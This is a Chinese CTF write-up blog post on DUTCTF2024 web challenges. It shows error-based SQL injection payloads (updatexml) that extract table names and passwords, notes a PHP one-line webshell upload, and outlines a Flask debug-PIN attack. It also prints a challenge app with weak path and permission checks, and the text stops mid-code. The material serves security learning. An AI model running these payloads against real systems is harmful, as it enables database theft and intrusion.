@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 7.3.0">
+
+  
+    <meta name="description" content="怎么样才能睡个好觉呢zzz......">
+  
+
+  
+
+  
+    <meta name="author" content="Ins0mn1a93">
+  
+
+  
+
+  
+
+  <title>DUTCTF2024复现 | Ins0mn1a</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  
+
+  
+
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(http://qiniu.sukoshi.xyz/src/images/68686407_p0.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          Ins0mn1a
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">首页</a></li>
+        
+          <li class="navbar-list-item"><a href="/archives">归档</a></li>
+        
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">DUTCTF2024复现</h1>
+          <h2 class="title-sub-wrap">
+            <strong>Ins0mn1a93</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2024-03-17T16:00:00.000Z" itemprop="datePublished">2024-03-18</time>
+          </h2>
+          
+            <h2 class="last-time">
+              <span>最后更新于</span>
+              <time  class="article-updated" datetime="2024-12-06T12:41:17.205Z" itemprop="dateUpdated">2024-12-06</time>
+            </h2>
+          
+          
+          <ul class="wrap-list dark">
+  
+    <li><a href="/categories/%E6%A0%A1%E9%99%A2%E8%B5%9B/">📒 校院赛</a></li>
+    
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/tags/CTF/">🏷️ CTF</a></li>
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h1><span id="web">WEB</span></h1>
+<h2><span id="数据库初学者">数据库初学者 😞</span></h2>
+<p>我知道这是sql注入，但唯独就没有往报错注入考虑，一直给我语法报错我还以为是哪写的不对…😭😭😭</p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>报错注入常用的函数updatexml的简单了解</p>
+<p>updatexml(xml_doument,XPath_string,new_value)</p>
+<p>第一个参数是xml文件的内容，格式一般为string</p>
+<p>第二个参数是文件需要更新的位置，即Xpath路径</p>
+<p>第三个参数是文件更新后的内容</p>
+<p>所以在采用报错注入的时候，第一个和第三个是随便写的，至于第二个嘛，就是注入的位置，待会看看Xpath</p>
+</blockquote>
+<p>一个简单的登录系统想要检查有无漏洞就需要最朴素的检测方式</p>
+<p>引号闭合</p>
+<p><img src="1.png" alt="1"></p>
+<p>这里测字段不多说，1‘ order by 1#即可（有3个字段）</p>
+<p>报错注入试试</p>
+<p><code>1' and updatexml(0,concat(0x7e,database()),0)#</code></p>
+<p><img src="2.png" alt="2"></p>
+<p>然后就是正常的爆列表爆字段了</p>
+<p><code>1' and updatexml(0,concat(0x7e,substr((select table_name from information_schema.tables where table_schema = 'FreakingData' limit 0,1),1,40)),0)#</code></p>
+<p><img src="3.png" alt="3"></p>
+<p>==（limit 0,1这一部分指的是全表扫描到第0条后截取一条数据，所以会存在只有一条数据的情况）==</p>
+<p><code>1' and updatexml(0,concat(0x7e,substr((select column_name from information_schema.columns where table_name = 'SPRING_SESSION' limit 0,1),1,40)),0)#</code></p>
+<p><code>1' and updatexml(0,concat(0x7e,substr((select column_name from information_schema.columns where table_name = 'users' limit 0,1),1,40)),0)#</code></p>
+<p><code>1' and updatexml(0,concat(0x7e,substr((select password from users limit 0,1),1,40)),0)#</code></p>
+<p><img src="4.png" alt="4"></p>
+<p><img src="5.png" alt="5"></p>
+<p><img src="6.png" alt="6"></p>
+<p>这一步会导致flag显示不全的原因是报错内容的长度限制为32，所以可以利用substr函数的特性，改变截取字符串的起点终点</p>
+<h2><span id="flask-file-manager">Flask File Manager</span></h2>
+<p>开始时账号密码藏的稍微有点隐蔽，原本想要sql注入，但失败了</p>
+<p>经过测试，才知道账号为ctfer，密码为dutctf_2024_&gt; _&lt;（有个空格，把它忽略掉，估计是Markdown的一些冲突）</p>
+<p>这里我不说废话，直接开门见山，讲一下我认为不可行的路径</p>
+<p>首先是传🐴，这里传入一句话木马上去之后想要读取1.php，但会报permission denied</p>
+<p><img src="11.png" alt="11"></p>
+<p>或者说你想进入upload目录，但是路由没有，说明文件不在我们常见的目录下</p>
+<p><img src="12.png" alt="12"></p>
+<p>目前有点一筹莫展的</p>
+<p>做题时无意间找到出题人留下的题目文件</p>
+<p>发现app.py有个error路由，且这题与flask有关，猜测可能是flask报错引起的漏洞</p>
+<p><img src="13.png" alt="13"></p>
+<p>成功进入到debug模式</p>
+<p><img src="14.png" alt="14"></p>
+<p>显然，一道flask pin的题目</p>
+<h3><span id="谈谈flask-pin">谈谈flask pin</span></h3>
+<p>为了得到pin码，我们需要以下6个值</p>
+<ol>
+<li>flask登录的用户名</li>
+<li>modname</li>
+<li>getaddr(app,“name”,<a target="_blank" rel="noopener" href="http://app.class.name">app.class.name</a>)</li>
+<li>flask库下app.py的绝对路径</li>
+<li>当前网络mac地址的十进制数</li>
+<li>docker机器的id</li>
+</ol>
+<p>+++</p>
+<p>一些敏感信息我们是需要较高权限才能读取，显然我们的权限不够</p>
+<p><a target="_blank" rel="noopener" href="http://xn--app-1d2e846rblva27c.py">这里给出app.py</a></p>
+<figure class="highlight python"><figcaption><span>行高亮</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, jsonify, abort</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从文件中读取密钥</span></span><br><span class="line">SECRET_KEY_FILE = <span class="string">&#x27;SECRETKEY&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(SECRET_KEY_FILE, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    app.secret_key = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件存储路径</span></span><br><span class="line">USER_DATA_FILE = <span class="string">&#x27;user_data.json&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传文件保存的目录</span></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;/upload&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查用户权限</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_permission</span>(<span class="params">username, file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(USER_DATA_FILE, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        user_data = json.load(f)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> user_data:</span><br><span class="line">        permissions = user_data[username].get(<span class="string">&#x27;permissions&#x27;</span>, [])</span><br><span class="line">        <span class="keyword">for</span> path, access <span class="keyword">in</span> permissions.items():</span><br><span class="line">            <span class="keyword">if</span> file_path.startswith(path) <span class="keyword">and</span> access == <span class="string">&#x27;read&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">file_path, username</span>):</span><br><span class="line">    <span class="keyword">if</span> check_permission(username, file_path):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">return</span> f.read()</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;File not found.&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Permission denied.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user_data.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            user_data = json.load(f)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> user_data <span class="keyword">and</span> user_data[username][<span class="string">&#x27;password&#x27;</span>] == password:</span><br><span class="line">            session[<span class="string">&#x27;logged_in&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;is_admin&#x27;</span>] = user_data[username].get(<span class="string">&#x27;is_admin&#x27;</span>, <span class="literal">False</span>)  <span class="comment"># 从user_data.json中读取用户是否为管理员信息</span></span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;file_reader&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid username/password&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证用户身份</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">authenticate_user</span>(<span class="params">username, password</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(USER_DATA_FILE, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        user_data = json.load(f)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> user_data:</span><br><span class="line">        <span class="keyword">return</span> user_data[username][<span class="string">&#x27;password&#x27;</span>] == password</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件管理器路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file_reader&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_reader</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;logged_in&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        file_path = request.form[<span class="string">&#x27;file_path&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查目录路径是否合法</span></span><br><span class="line">        <span class="keyword">if</span> file_path != <span class="string">&#x27;/&#x27;</span> <span class="keyword">and</span> (<span class="keyword">not</span> <span class="built_in">all</span>(char.isalnum() <span class="keyword">or</span> char <span class="keyword">in</span> [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;.&#x27;</span>] <span class="keyword">for</span> char <span class="keyword">in</span> file_path) <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> file_path):</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&#x27;Invalid directory path&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查目录路径是否包含 &#x27;flag&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> file_path:</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&#x27;Nah, flag not allowed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查用户是否有权限访问特定文件或目录</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_permissions(file_path, session[<span class="string">&#x27;username&#x27;</span>]):</span><br><span class="line">            abort(<span class="number">403</span>, <span class="string">&#x27;You are not authorized to read this file&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        file_content = read_file(file_path, session[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查文件内容是否为空，如果为空则文件不存在</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> file_content:</span><br><span class="line">            abort(<span class="number">404</span>, <span class="string">&#x27;File not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;file_reader.html&#x27;</span>, file_content=file_content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;file_reader.html&#x27;</span>, file_content=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出登录路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;logged_in&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取权限页面路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_user_permissions&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_permissions</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="comment"># 渲染模板并传递用户列表</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user_data.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            user_data = json.load(f)</span><br><span class="line">        users = <span class="built_in">list</span>(user_data.keys())</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;get_user_permissions.html&#x27;</span>, users=users)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="comment"># 获取POST请求中选择的用户</span></span><br><span class="line">        selected_user = request.form[<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从 JSON 文件中读取用户信息</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user_data.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            user_data = json.load(f)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取特定用户的权限配置</span></span><br><span class="line">        permissions = user_data.get(selected_user, &#123;&#125;).get(<span class="string">&#x27;permissions&#x27;</span>, &#123;&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jsonify(permissions)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新权限页面路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/update_permissions&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_permissions</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;logged_in&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;is_admin&#x27;</span>):</span><br><span class="line">        abort(<span class="number">403</span>, <span class="string">&#x27;User not allowed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从 JSON 文件中读取用户信息</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user_data.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        user_data = json.load(f)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="comment"># 如果用户不是管理员，只允许修改自己的权限</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;is_admin&#x27;</span>):</span><br><span class="line">            users = [session[<span class="string">&#x27;username&#x27;</span>]]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users = [user <span class="keyword">for</span> user, data <span class="keyword">in</span> user_data.items()]</span><br><span class="line">            <span class="comment"># 提取所有非管理员用户的用户名</span></span><br><span class="line">            <span class="comment"># users = [user for user, data in user_data.items() if not data[&#x27;is_admin&#x27;]]</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;update_permissions.html&#x27;</span>, users=users)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="comment"># 获取表单数据</span></span><br><span class="line">        user = request.form[<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line">        path = request.form[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">        access = request.form[<span class="string">&#x27;access&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查新添加的目录路径是否只包含 &#x27;/&#x27;、&#x27;_&#x27;、&#x27;-&#x27;数字和字母，且以&#x27;/&#x27;结尾</span></span><br><span class="line">        <span class="keyword">if</span> path != <span class="string">&#x27;/&#x27;</span> <span class="keyword">and</span> <span class="keyword">not</span> (path.endswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">and</span> <span class="built_in">all</span>(char.isalnum() <span class="keyword">or</span> char <span class="keyword">in</span> [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;-&#x27;</span>] <span class="keyword">for</span> char <span class="keyword">in</span> path[:-<span class="number">1</span>])):</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&#x27;Invalid directory path&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查新添加的目录路径是否包含 &#x27;flag&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> path:</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&#x27;Nah, flag not allowed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果用户不是管理员，只允许修改自己的权限</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;is_admin&#x27;</span>) <span class="keyword">and</span> user != session[<span class="string">&#x27;username&#x27;</span>]:</span><br><span class="line">            abort(<span class="number">403</span>, <span class="string">&quot;You are not authorized to modify other users&#x27; permissions&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查添加的目录是否与已存在的目录相同</span></span><br><span class="line">        <span class="keyword">if</span> path <span class="keyword">in</span> user_data[user][<span class="string">&#x27;permissions&#x27;</span>]:</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&quot;Directory already exists&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 更新用户权限</span></span><br><span class="line">        user_data[user][<span class="string">&#x27;permissions&#x27;</span>][path] = access</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user_data.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            json.dump(user_data, f, indent=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/update_permissions&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件上传路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file_uploader&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&#x27;No selected file&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>(char.isalnum() <span class="keyword">or</span> char <span class="keyword">in</span> [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;-&#x27;</span>] <span class="keyword">for</span> char <span class="keyword">in</span> file.filename):</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&#x27;Invalid filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查目录下是否已经存在同名文件</span></span><br><span class="line">        target_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(target_path):</span><br><span class="line">            abort(<span class="number">400</span>, <span class="string">&quot;File already existed&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> file:</span><br><span class="line">            file.save(target_path)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;File uploaded successfully&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果是 GET 请求，则返回文件上传页面</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;file_uploader.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根路径重定向至登录页面</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span 